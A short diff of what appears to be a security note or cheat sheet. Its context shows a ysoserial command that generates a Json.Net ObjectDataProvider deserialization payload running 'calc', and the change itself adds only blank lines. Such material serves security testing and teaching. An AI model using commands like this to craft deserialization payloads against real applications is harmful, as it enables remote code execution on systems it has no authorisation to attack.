@@ -14,3 +14,5 @@ updated_at: '2023-04-06T03:55:59.103582+00:00'
 ```ps1
 $ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
 ```
+
+
